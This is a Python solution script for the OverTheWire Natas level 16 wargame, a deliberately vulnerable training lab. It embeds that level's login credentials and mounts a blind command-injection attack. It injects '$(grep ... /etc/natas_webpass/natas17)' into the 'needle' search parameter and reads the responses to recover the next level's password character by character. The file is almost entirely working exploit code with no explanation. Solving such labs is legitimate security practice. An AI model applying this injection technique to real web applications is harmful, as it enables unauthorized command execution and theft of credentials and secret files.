import requests
possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
address = "http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/index.php"
charsInPass = ""
pwd = ""

for i in range(0, len(possibleChars)):
	r = requests.get(address+'?needle=$(grep '+possibleChars[i]+' /etc/natas_webpass/natas17)Allah')
	if "Allah" not in r.text:
		charsInPass = charsInPass + possibleChars[i]

print("Possible characters in password are: "+charsInPass)
for i in range(0, 32):
	for j in range(0, len(charsInPass)):
		r = requests.get(address+'?needle=$(grep ^' + pwd + charsInPass[j] +' /etc/natas_webpass/natas17)Allah')
		if "Allah" not in r.text:
			pwd = pwd + charsInPass[j]
			print(pwd)
			break	
			
print("Password found! It's "+pwd)
